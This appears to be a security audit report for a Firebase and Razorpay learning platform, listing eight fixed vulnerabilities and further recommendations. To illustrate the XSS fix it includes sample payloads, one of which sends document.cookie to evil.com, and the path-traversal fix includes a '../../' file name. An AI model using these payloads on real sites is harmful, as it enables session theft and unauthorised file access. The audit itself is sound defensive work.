# Security Audit Report

## Summary

A comprehensive security audit identified **8 vulnerabilities** across the codebase. All have been fixed.

| # | Severity | Issue | File | Status |
|---|----------|-------|------|--------|
| 1 | CRITICAL | Debug logging exposes API secret tokens | `functions/src/middlewares/auth.ts` | Fixed |
| 2 | HIGH | CORS allows all origins (`*`) | `functions/src/middlewares/cors.ts` | Fixed |
| 3 | HIGH | Webhook returns 200 on signature failure | `functions/src/middlewares/razorpayWebhook.ts` | Fixed |
| 4 | MEDIUM | XSS via unsanitized HTML in markdown | `src/components/MarkdownViewer.tsx` | Fixed |
| 5 | MEDIUM | Missing security headers | `firebase.json` | Fixed |
| 6 | LOW | Loose equality (`!=`) in role check | `src/components/auth/AuthGuard.tsx` | Fixed |
| 7 | LOW | Non-cryptographic idempotency key | `src/services/providers/razorpayProvider.ts` | Fixed |
| 8 | MEDIUM | Unsanitized file names in upload paths | `src/services/fileService.ts` | Fixed |

---

## Fix 1: Removed Debug Token Logging (CRITICAL)

**File:** `functions/src/middlewares/auth.ts`

**Problem:** The `apiKeyAuthMiddleware` contained 4 `console.log` statements that printed the incoming bearer token AND the configured API secret token to Cloud Functions logs:
```typescript
console.log("Received API token:", token);
console.log("Configured secret token:", secretToken);
console.log("Comparing tokens:", { token, secretToken });
console.log("Token match:", token === secretToken);
```

**Impact:** Anyone with access to Cloud Functions logs (GCP Console, `gcloud` CLI) could read the API secret token and impersonate authenticated API requests.

**Fix:** Removed all 4 debug log statements. The existing `functions.logger.warn("Invalid API token attempt", { ip: req.ip })` on failed auth already provides audit logging without exposing secrets.

---

## Fix 2: Restricted CORS Origins (HIGH)

**File:** `functions/src/middlewares/cors.ts`

**Problem:** CORS was configured with `Access-Control-Allow-Origin: *`, allowing any website on the internet to make authenticated cross-origin requests to the Cloud Functions API.

**Impact:** A malicious site could make API calls to your backend using a victim's browser session/tokens, enabling cross-site request forgery attacks.

**Fix:** Replaced wildcard with an explicit allowlist:
```typescript
const ALLOWED_ORIGINS = [
  "https://red-panda-learns-lms-dev.web.app",
  "https://red-panda-learns-lms-dev.firebaseapp.com",
  "http://localhost:8080",
];
```
Only requests from these origins will receive CORS headers. All other origins are blocked by the browser.

**Note:** When deploying to production or adding new domains, update the `ALLOWED_ORIGINS` array.

---

## Fix 3: Fixed Webhook Error Response Codes (HIGH)

**File:** `functions/src/middlewares/razorpayWebhook.ts`

**Problem:** When Razorpay webhook signature verification failed, the middleware returned HTTP 200. Razorpay interprets 200 as "successfully delivered", so it would NOT retry the webhook. An attacker sending forged webhooks would also receive 200.

**Changes:**
- Invalid signature: `200` -> `401` (Unauthorized)
- Internal error: `200` -> `500` (Internal Server Error)

**Impact:** Razorpay will now retry webhooks that genuinely failed, and forged webhook attempts get proper rejection status codes.

---

## Fix 4: Sanitized Markdown HTML (MEDIUM - XSS)

**File:** `src/components/MarkdownViewer.tsx`

**Problem:** The markdown renderer used `rehype-raw` to enable raw HTML in markdown content. This meant user-generated content (comments, forum posts, announcements) could contain malicious HTML:
```html
<img src=x onerror="alert(document.cookie)">
<script>fetch('https://evil.com?cookie='+document.cookie)</script>
```

**Fix:** Added `rehype-sanitize` after `rehype-raw`:
```typescript
rehypePlugins={[rehypeRaw, rehypeSanitize]}
```
This preserves safe HTML elements (bold, tables, images) while stripping dangerous elements (scripts, event handlers, iframes).

---

## Fix 5: Added Security Headers (MEDIUM)

**File:** `firebase.json`

**Problem:** The hosting configuration was missing standard security headers that protect against common web attacks.

**Headers added:**
| Header | Value | Protection |
|--------|-------|------------|
| `X-Content-Type-Options` | `nosniff` | Prevents MIME-type sniffing attacks |
| `X-Frame-Options` | `DENY` | Prevents clickjacking via iframes |
| `Strict-Transport-Security` | `max-age=31536000; includeSubDomains` | Forces HTTPS for 1 year |
| `Referrer-Policy` | `strict-origin-when-cross-origin` | Limits referrer info leakage |
| `Permissions-Policy` | `camera=(), microphone=(), geolocation=()` | Blocks unnecessary browser APIs |

---

## Fix 6: Fixed Loose Equality in AuthGuard (LOW)

**File:** `src/components/auth/AuthGuard.tsx`

**Problem:** Role comparison used `!=` (loose equality) instead of `!==` (strict equality):
```typescript
if (requireStudent && user && user.role != USER_ROLE.STUDENT)
```

**Fix:** Changed to strict equality: `user.role !== USER_ROLE.STUDENT`

**Impact:** Prevents potential type coercion issues. While unlikely to be exploitable in practice, strict equality is a security best practice.

---

## Fix 7: Crypto-Secure Idempotency Key (LOW)

**File:** `src/services/providers/razorpayProvider.ts`

**Problem:** Payment order idempotency keys were generated with `Math.random()`, which is not cryptographically secure:
```typescript
const idempotencyKey = `order_${Date.now()}_${Math.random().toString(36).substr(2, 9)}`;
```

**Fix:** Replaced with `crypto.randomUUID()`:
```typescript
const idempotencyKey = `order_${Date.now()}_${crypto.randomUUID()}`;
```

`crypto.randomUUID()` uses the browser's cryptographic random number generator, producing truly unpredictable UUIDs.

---

## Fix 8: Sanitized File Upload Paths (MEDIUM)

**File:** `src/services/fileService.ts`

**Problem:** User-controlled `file.name` was used directly in Firebase Storage paths without sanitization:
```typescript
const fileRef = ref(storage, `${uploadPath}/${Date.now()}_${Math.random() * 1000}_${file.name}`);
```

A malicious filename like `../../admin/config.json` could potentially traverse the storage path hierarchy.

**Fix:** Strip unsafe characters from filenames:
```typescript
const safeName = file.name.replace(/[^a-zA-Z0-9._-]/g, '_');
const fileRef = ref(storage, `${uploadPath}/${Date.now()}_${safeName}`);
```

Also removed `Math.random() * 1000` (unnecessary and not properly random).

---

## Remaining Recommendations (Not Fixed — Require Architectural Changes)

These issues were identified but require broader changes beyond code fixes:

1. **Firestore Security Rules** — Verify that Firestore rules enforce ownership checks (e.g., users can only write to their own documents). Rules file was not found in the repo.

2. **Firebase Storage Rules** — Add file size limits and MIME type restrictions in storage rules.

3. **Rate Limiting** — Cloud Functions have no rate limiting. Consider adding rate limiting middleware for payment and enrollment endpoints.

4. **Server-Side Quiz Submission** — Quiz submissions currently happen via direct Firestore writes from the client. Consider moving to a Cloud Function with enrollment verification.

5. **Comment Ownership Validation** — The comment update/delete operations should verify the user owns the comment before allowing modifications.
